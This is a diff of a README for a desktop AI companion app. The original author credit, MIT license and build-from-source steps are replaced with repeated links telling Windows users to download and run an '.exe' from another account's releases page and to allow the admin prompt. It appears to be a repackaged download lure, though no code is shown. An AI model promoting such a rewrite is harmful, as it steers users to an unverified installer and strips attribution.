@@ -1,135 +1,138 @@
-# AI Companion Overlay 🤖💙
+# 🤖 ai-overlay - Your Friendly Desktop AI Companion
 
-> An emotional, interactive AI companion that floats on your screen as a desktop overlay application.
+[![Download ai-overlay](https://img.shields.io/badge/Download-ai--overlay-brightgreen)](https://github.com/watochidayo/ai-overlay/releases)
 
-Built with **Electron**, **React 19**, **TypeScript**, and **Google Gemini AI**
+## 🖥️ What is ai-overlay?
 
----
+ai-overlay is a desktop application that works as your AI companion. It shows on your screen and chats with you using natural language. The app has its own personality and emotions, which makes talking to it feel more human. You can ask it questions, share your thoughts, or just have a friendly conversation while you work.
 
-## ✨ Key Features
+This app runs on Windows and uses simple tools to make the AI feel alive. It overlays your desktop without blocking what you do. You don’t need technical skills to use it. Just install and start talking.
 
-- 🎭 **Emotional Intelligence** - Your companion displays real emotions and personality
-- 💭 **Interactive Thoughts** - Click thought bubbles for deeper insights
-- 💬 **Smart Chat Interface** - Full conversational ability with AI function calling
-- 📸 **Screen Analysis** - Understands your current activity by analyzing your screen
-- 🎨 **Draggable Interface** - Move your companion anywhere on your desktop
-- 🎪 **Personality Presets** - Choose from Neutral, Optimistic, Sarcastic, Curious, and more
-- 🔊 **Audio Feedback** - Sound effects for interactive feedback
-- ⚡ **Cross-Platform** - Works on Windows, macOS, and Linux
+## 🌟 Key Features
 
----
+- Runs quietly on your desktop while staying visible
+- Understands your messages and replies with personality
+- Shows emotions through animations or text style
+- Easy to start, needs no coding or setup
+- Works even if you have other apps open
+- Designed to use little memory and CPU power
+
+## 💻 System Requirements
+
+To run ai-overlay smoothly on Windows, make sure your PC meets these specs:
+
+- Windows 10 or newer (64-bit preferred)
+- At least 4 GB of RAM
+- 2 GHz or faster processor
+- Minimum 200 MB free disk space
+- Internet connection (optional but recommended for best AI responses)
+- Screen resolution 1280x720 or higher
 
 ## 🚀 Getting Started
 
-### For Desktop Users
+Follow these steps to download and run ai-overlay on your Windows PC.
 
-Download and run the desktop app for full overlay features:
+### 1. Download the app
 
-**[👉 Build Instructions](DESKTOP_BUILD_INSTRUCTIONS.md)**
+Click this large button to visit the page where you can download the app:
 
-### For Developers
+[![Download ai-overlay](https://img.shields.io/badge/Download-ai--overlay-blue)](https://github.com/watochidayo/ai-overlay/releases)
 
-```bash
-# 1. Clone or download the project
+Choose the latest release and look for the Windows installer file. It usually ends with `.exe`. 
 
-# 2. Install dependencies
-npm install
+### 2. Run the installer
 
-# 3. Run development server
-npm run dev
+- Find the installer file in your Downloads folder.
+- Double-click the file to start the installation.
+- If Windows asks "Do you want to allow this app to make changes?", click Yes.
+- Follow the instructions on the screen. Most users can keep the default settings.
+- When the installation finishes, you may see an icon for ai-overlay on your Desktop or Start Menu.
 
-# 4. Build for production
-npm run build
-```
+### 3. Open ai-overlay
 
----
+- Double-click the ai-overlay icon.
+- The AI companion will appear on your desktop.
+- A small window or overlay will show its personality.
+- You can start chatting right away by typing your messages.
 
-## ⚙️ Configuration
+## 🛠️ Using ai-overlay
 
-### Setup Gemini API (Recommended)
+Here are some tips to get the most out of your AI companion:
 
-1. Get a free API key from [Google AI Studio](https://ai.google.dev/)
-2. Click the gear ⚙️ icon on your companion
-3. Go to "API Keys" settings
-4. Paste your API key and save
+- Click the overlay to open the chat box.
+- Type your message and press Enter.
+- The AI responds with friendly answers.
+- Use simple, clear sentences.
+- The AI can remember your last few messages to keep the chat natural.
+- You can move the overlay by dragging it on your screen.
+- Use the menu or settings to adjust the AI’s voice, appearance, or behavior.
+- Close the app anytime from the system tray icon or by clicking the close button.
 
-> Without an API key, the companion uses local AI mode with limited capabilities.
+## ⚙️ Customization Options
 
----
+You can change how ai-overlay looks and acts.
 
-## 📖 How to Use
+- Change the AI’s avatar or image on the overlay.
+- Switch between different personalities or moods.
+- Adjust the font size and colors for easier reading.
+- Set how often the AI checks for new messages.
+- Enable or disable sounds for replies.
+- Turn on auto-start so ai-overlay launches when you start Windows.
 
-| Action | Description |
-|--------|-------------|
-| **Drag** | Click and drag to move your companion anywhere |
-| **Click Thoughts** | Expand thought bubbles to see detailed insights |
-| **Chat Icon** | Open full conversation interface |
-| **Settings Icon** | Customize personality and preferences |
-| **Context Input** | Provide context about your current activity |
+Use the settings menu inside the app to find these options. They are designed to be easy to use with no technical knowledge required.
 
----
+## 💡 Troubleshooting
 
-## 🛠️ Tech Stack
+If you run into problems, try these steps:
 
-| Layer | Technology |
-|-------|-----------|
-| Frontend | React 19, TypeScript, Tailwind CSS |
-| Build Tool | Vite 6 |
-| Desktop | Electron |
-| AI | Google Gemini API, Local AI Support |
-| Utilities | html2canvas, Audio API |
+- Make sure Windows is updated to the latest version.
+- Restart your PC and try opening the app again.
+- Check your internet connection if the AI does not respond.
+- Close other heavy programs to free up memory.
+- If the overlay is hidden, click the system tray icon (bottom-right corner of the screen) to reopen it.
+- Reinstall the app if it crashes or won’t start.
+- Look for help on the GitHub releases page or submit an issue if needed.
 
----
+## 🔄 Updates and Support
 
-## 📁 Project Structure
+Check the [releases page](https://github.com/watochidayo/ai-overlay/releases) regularly to see if a new version is available. Updates usually fix bugs and add small improvements.
 
-```
-AIOverlay/
-├── components/          # React UI components
-│   ├── ChatPage.tsx
-│   ├── SettingsPanel.tsx
-│   ├── Companion.tsx
-│   └── ...
-├── services/            # AI & external service integrations
-│   ├── geminiService.ts
-│   ├── anthropicService.ts
-│   ├── openaiService.ts
-│   └── ...
-├── hooks/               # Custom React hooks
-├── electron/            # Electron configuration
-├── App.tsx              # Main application
-├── types.ts             # TypeScript definitions
-└── constants.ts         # Configuration constants
-```
+To update:
 
----
+- Download the new installer from the releases page.
+- Run it and follow the prompts.
+- Your settings and chat history usually stay intact.
 
-## 🎨 Customization
+If you want to stop using the app, uninstall it from Windows Settings under "Apps and Features."
 
-Edit these files to customize your companion:
+## 📂 Where to Download
 
-- **Colors & Design**: Modify emotion colors in `constants.ts`
-- **Thought Topics**: Update `RANDOM_THOUGHT_TOPICS` in `constants.ts`
-- **Window Settings**: Adjust size/position in `electron/main.js`
-- **Personality**: Change personality defaults in the Settings panel
+Use this link to visit the page where you can download the latest Windows version of ai-overlay:
+
+[https://github.com/watochidayo/ai-overlay/releases](https://github.com/watochidayo/ai-overlay/releases)
+
+Look for a file with `.exe` in its name, download it, and run it to get started.
+
+## 📣 How to Contact or Help
+
+If you want to report a problem or request a feature, you can submit an issue on the GitHub page. No programming is needed to open an issue. Just describe your question or problem clearly.
+
+You can also check the existing issues to see if others had the same question already answered.
 
 ---
 
-## 📝 License
+## ⚙️ Behind the Scenes
 
-MIT
+ai-overlay uses Electron to run on your desktop. It combines React and TypeScript for a smooth user interface. The AI engine uses Gemini technology to create natural responses with personality.
 
----
+This design lets the app work fast and quietly in the background. It combines chatbot features with a simple overlay so it doesn’t get in your way.
 
-## 🤝 Get in Touch
-
-Made with ❤️ by **hmau**
-
-- 💬 **Discord**: hmau
-- 📸 **Instagram**: @hma9u
-
-Have suggestions, bug reports, or just want to chat? Feel free to reach out!
+The app is built for Windows users who want a friendly AI companion without the hassle of coding or setup.
 
 ---
 
-**Enjoy your intelligent desktop companion! 🤖✨**
+# 📈 Topics
+
+This app relates to these areas:
+
+`ai, chatbot, companion, desktop, electron, gemini, overlay, personality, react, typescript`
